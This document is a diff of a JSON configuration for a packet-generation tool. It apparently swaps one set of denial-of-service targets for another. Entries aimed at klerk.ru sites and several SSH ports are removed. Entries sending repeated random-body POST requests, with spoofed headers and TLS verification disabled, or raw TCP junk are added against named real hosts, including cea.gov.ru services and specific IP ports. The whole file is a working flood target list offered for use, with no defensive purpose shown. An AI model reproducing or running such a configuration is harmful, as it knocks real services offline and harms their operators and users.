@@ -8,14 +8,58 @@
         },
         {
             "type": "packetgen",
-            "count": 23,
-            "name": "https://www.klerk.ru",
+            "count": 90,
+            "name": "tcp://83.242.155.164:5061",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "www.klerk.ru:443",
+                        "address": "83.242.155.164:5061"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 90,
+            "name": "tcp://83.242.155.164:444",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "83.242.155.164:444"
+                    }
+                },
+                "packet": {
+                    "payload": {
+                        "type": "raw",
+                        "data": {
+                            "payload": "{{ random_payload 10 }}"
+                        }
+                    }
+                }
+            }
+        },
+        {
+            "type": "packetgen",
+            "count": 90,
+            "name": "https://sip.cea.gov.ru",
+            "args": {
+                "connection": {
+                    "type": "net",
+                    "args": {
+                        "protocol": "tcp",
+                        "address": "sip.cea.gov.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -26,7 +70,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://www.klerk.ru",
+                            "path": "https://sip.cea.gov.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -39,9 +83,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://www.klerk.ru",
-                                "Referer": "https://www.klerk.ru",
-                                "X-Forwarded-Host": "www.klerk.ru",
+                                "Origin": "https://sip.cea.gov.ru",
+                                "Referer": "https://sip.cea.gov.ru",
+                                "X-Forwarded-Host": "sip.cea.gov.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
@@ -52,96 +96,14 @@
         },
         {
             "type": "packetgen",
-            "count": 23,
-            "name": "http://forum.klerk.ru",
+            "count": 90,
+            "name": "tcp://84.42.64.145:3478",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "forum.klerk.ru:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://forum.klerk.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://forum.klerk.ru",
-                                "Referer": "http://forum.klerk.ru",
-                                "X-Forwarded-Host": "forum.klerk.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 23,
-            "name": "http://second.klerk.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "second.klerk.ru:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://second.klerk.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://second.klerk.ru",
-                                "Referer": "http://second.klerk.ru",
-                                "X-Forwarded-Host": "second.klerk.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 23,
-            "name": "tcp://185.229.9.88:5901",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "185.229.9.88:5901"
+                        "address": "84.42.64.145:3478"
                     }
                 },
                 "packet": {
@@ -156,36 +118,14 @@
         },
         {
             "type": "packetgen",
-            "count": 23,
-            "name": "tcp://185.229.9.114:22",
+            "count": 90,
+            "name": "https://lyncdiscover.cea.gov.ru",
             "args": {
                 "connection": {
                     "type": "net",
                     "args": {
                         "protocol": "tcp",
-                        "address": "185.229.9.114:22"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "raw",
-                        "data": {
-                            "payload": "{{ random_payload 10 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 23,
-            "name": "https://gamma.klerk.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "gamma.klerk.ru:443",
+                        "address": "lyncdiscover.cea.gov.ru:443",
                         "tls_config": {
                             "insecure_skip_verify": true
                         }
@@ -196,7 +136,7 @@
                         "type": "http",
                         "data": {
                             "method": "POST",
-                            "path": "https://gamma.klerk.ru",
+                            "path": "https://lyncdiscover.cea.gov.ru",
                             "headers": {
                                 "Accept": "*/*",
                                 "Accept-Encoding": "gzip, deflate, br",
@@ -209,201 +149,9 @@
                                 "Sec-Fetch-User": "?1",
                                 "Pragma": "no-cache",
                                 "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://gamma.klerk.ru",
-                                "Referer": "https://gamma.klerk.ru",
-                                "X-Forwarded-Host": "gamma.klerk.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 23,
-            "name": "https://vpn.klerk.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "vpn.klerk.ru:443",
-                        "tls_config": {
-                            "insecure_skip_verify": true
-                        }
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "https://vpn.klerk.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "https://vpn.klerk.ru",
-                                "Referer": "https://vpn.klerk.ru",
-                                "X-Forwarded-Host": "vpn.klerk.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 23,
-            "name": "tcp://185.229.9.88:22",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "185.229.9.88:22"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "raw",
-                        "data": {
-                            "payload": "{{ random_payload 10 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 23,
-            "name": "tcp://185.229.9.133:22",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "185.229.9.133:22"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "raw",
-                        "data": {
-                            "payload": "{{ random_payload 10 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 23,
-            "name": "tcp://185.229.9.134:22",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "185.229.9.134:22"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "raw",
-                        "data": {
-                            "payload": "{{ random_payload 10 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 23,
-            "name": "http://is.klerk.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "is.klerk.ru:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://is.klerk.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://is.klerk.ru",
-                                "Referer": "http://is.klerk.ru",
-                                "X-Forwarded-Host": "is.klerk.ru",
-                                "User-Agent": "{{ random_user_agent }}"
-                            },
-                            "body": "{{ random_payload 1000 }}"
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "packetgen",
-            "count": 23,
-            "name": "http://moscow.klerk.ru",
-            "args": {
-                "connection": {
-                    "type": "net",
-                    "args": {
-                        "protocol": "tcp",
-                        "address": "moscow.klerk.ru:80"
-                    }
-                },
-                "packet": {
-                    "payload": {
-                        "type": "http",
-                        "data": {
-                            "method": "POST",
-                            "path": "http://moscow.klerk.ru",
-                            "headers": {
-                                "Accept": "*/*",
-                                "Accept-Encoding": "gzip, deflate, br",
-                                "Accept-Language": "ru-RU,ru;q=0.9,en-US,en;q=0.7",
-                                "Cache-Control": "max-age=0",
-                                "Connection": "Keep-Alive",
-                                "Sec-Fetch-Dest": "document",
-                                "Sec-Fetch-Mode": "navigate",
-                                "Sec-Fetch-Site": "same-origin",
-                                "Sec-Fetch-User": "?1",
-                                "Pragma": "no-cache",
-                                "Upgrade-Insecure-Requests": "1",
-                                "Origin": "http://moscow.klerk.ru",
-                                "Referer": "http://moscow.klerk.ru",
-                                "X-Forwarded-Host": "moscow.klerk.ru",
+                                "Origin": "https://lyncdiscover.cea.gov.ru",
+                                "Referer": "https://lyncdiscover.cea.gov.ru",
+                                "X-Forwarded-Host": "lyncdiscover.cea.gov.ru",
                                 "User-Agent": "{{ random_user_agent }}"
                             },
                             "body": "{{ random_payload 1000 }}"
